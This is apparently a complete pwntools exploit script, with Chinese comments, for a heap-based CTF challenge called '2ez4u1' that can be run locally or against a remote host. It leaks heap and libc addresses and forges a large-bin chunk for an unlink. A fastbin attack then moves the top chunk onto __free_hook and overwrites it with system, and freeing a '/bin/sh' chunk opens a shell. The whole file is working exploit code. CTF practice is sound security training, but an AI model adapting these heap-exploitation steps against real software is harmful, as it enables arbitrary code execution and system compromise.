#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './2ez4u1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('5. quit\n')
    p.recvuntil('your choice: ')

def create(size, content, val=0, num=0, col=0):
    eat()
    p.sendline('1')
    p.recvuntil('color?(0:red, 1:green):')
    p.sendline(str(col))
    p.recvuntil('value?(0-999):')
    p.sendline(str(val))
    p.recvuntil('num?(0-16):')
    p.sendline(str(num))
    p.recvuntil('description length?(1-1024):')
    p.sendline(str(size))
    p.recvuntil('apple:')
    p.send(content)

def delete(index):
    eat()
    p.sendline('2')
    p.recvuntil('which?(0-15):')
    p.sendline(str(index))

def edit(index, content,val=1000, num=17, col=3):
    eat()
    p.sendline('3')
    p.recvuntil('which?(0-15):')
    p.sendline(str(index))
    p.recvuntil('color?(0:red, 1:green):')
    p.sendline(str(col))
    p.recvuntil('value?(0-999):')
    p.sendline(str(val))
    p.recvuntil('num?(0-16):')
    p.sendline(str(num))
    p.recvuntil('new description of the apple:')
    p.send(content)

def show(index):
    eat()
    p.sendline('4')
    p.sendline(str(index))


create(0x10,'a\n') #0
create(0x10,'a\n') #1
create(0x10,'n\n') #2
create(0x3e0,"a\n") # 3 0x400 large_bin
create(0x60,"a\n")  #4
create(0x3f0,"a\n") # 5 0x410 large_bin
create(0x40,"a\n")  #6 fake_large
create(0x80,'a\n')  #7
create(0x60,'a\n')  #8
create(0x50,'a\n') #9
create(0x290,'b\n') #10
create(0x80,'a\n') #11


delete(0)# 在申请large chunk时 fastbin进行合并


## step 1 delete 2 large bin and leak heap address
delete(5)
delete(3)


# 使 unsorted_bin 中的两个进 large_bin
create(0x400, "a\n")  # 0

show(3)

p.recvuntil("tion:")
heap_base = u64(p.recvuntil("\n")[:-1].ljust(8,b'\x00')) - 0x510
log.success('heap_base: ' + hex(heap_base))


unlink_ptr = heap_base + 0x40 + 0x18 # 这题是从 0x18 开始写或者读，所以在 +0x18 的位置比较方便
fake_large = heap_base + 0x910 + 0x30
log.success('unlink_addr: ' + hex(unlink_ptr))
log.success('fake_large: ' + hex(fake_large))
payload = p64(0x411)+p64(unlink_ptr-0x18)+p64(unlink_ptr-0x10)

edit(1, p64(fake_large) + b'\n') # write large bin address to bypass unlink the largebin

edit(6, payload + b"\n")


edit(10, b'a' * 0x218 + p64(0x410) + p64(0x10) + b'\n') # 为了绕过 malloc 时， unlink 检查 prev_size
# fake_large size 为 0x410


payload = p64(fake_large)+b'\n'
edit(3, payload)# bk_nextsize


delete(1)  ## clear 1st to avoid overwrite the 3rd ptr


delete(11)

delete(7)  # delete the same size chunk to smallbin to bypass '\x00' truncated in add(puts)


payload = b'a' * 0x28 + p64(heap_base + 0xdc0)[:-1] + b'\n' # heap_base + 0xdc0 是 small_chunk 的地址,不去破坏原来的 bk 和 fd
log.success('heap_base + 0xdc0: ' + hex(heap_base + 0xdc0))

create(0x3f0, payload)  # 利用之前伪造的 bk_nextsize  1 malloc out the fake largebin

# 0x980 0xdc0


edit(3, p64(heap_base + 0x510) + b'\n') # fix the largebin chain，bk_size 修回去才能再申请， heap_base + 0x510 是 size 为 0x410 的 chunk
log.success('heap_base + 0x510: ' + hex(heap_base + 0x510))


create(0x80, b'1\n')  # 3 ## malloc out 0xdc0 and change fd to main arena


show(1)

p.recvuntil('a' * 0x28)
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4c08
log.success('libc.address: ' + hex(libc.address))

free_hook = libc.symbols['__free_hook']
system_addr = libc.symbols['system']
log.success('free_hook: ' + hex(free_hook))


edit(1, b'a'*0x18+p64(0)+p64(0xa1)[:-1]+b'\n') # fix chunk header 修回 0xa1，方便调试

# step 4 fastbin attack to change top chunk which point to __free_hook
delete(8)# 0x80
delete(9)# 0x70

main_arena = 0x3c4b20 + libc.address
log.success('main_arena: ' + hex(main_arena))
fake_fastbin = 0x3c4b20 + libc.address + 0x30 # 0x70
log.success('fake_fastbin: ' + hex(fake_fastbin))



payload = b'a'*0x18+p64(0)+p64(0xa1)+b'\x00'*0x90+p64(0)+p64(0x81)+p64(0x71)+p64(0x0)+b'\x00'*0x60+p64(0)+p64(0x71)+p64(fake_fastbin)[:-1]+b'\n'
edit(1, payload) # change fastbin chain to form fastbin attack




create(0x60,'a\n') # 5

create(0x50,'a\n') # 6


payload = p64(free_hook - 0xb58)[:-1] + b'\n'
log.success('free_hook - 0xb58: ' + hex(free_hook - 0xb58))
create(0x50, payload)  # 7 overwrite top chunk to __free_hook， +0x18 刚刚好就是top_chunk_ptr



delete(5)

payload = b'a' * 0x18 + p64(0) + p64(0xa1) + b'\x00' * 0x90 + p64(0) + p64(0x81) + p64(0) + b'\n'# fix 0x71去掉
edit(1, payload)


delete(2)

create(0x60, b'a\n')  # 2

create(0x400, b'\n')  # 5
create(0x400, b'\n')  # 5
debug()
create(0x300, b'\n')  # 5
create(0x300, b'\n')  # 9
create(0x300, b'\n')  # 12
create(0x300, b'\n')  # 13
create(0x300, b'\n')  # 14


payload = b'\x00' * 0x1d0 + p64(system_addr) + b'\n'
create(0x320, payload)  # 15

payload = b'a' * 0x18 + p64(0) + p64(0xa1) + b'\x00' * 0x90 + p64(0) + p64(0x81) + b'/bin/sh\x00' + b'\n'
edit(1, payload)

## trigger free to get shell
delete(2)

p.interactive()
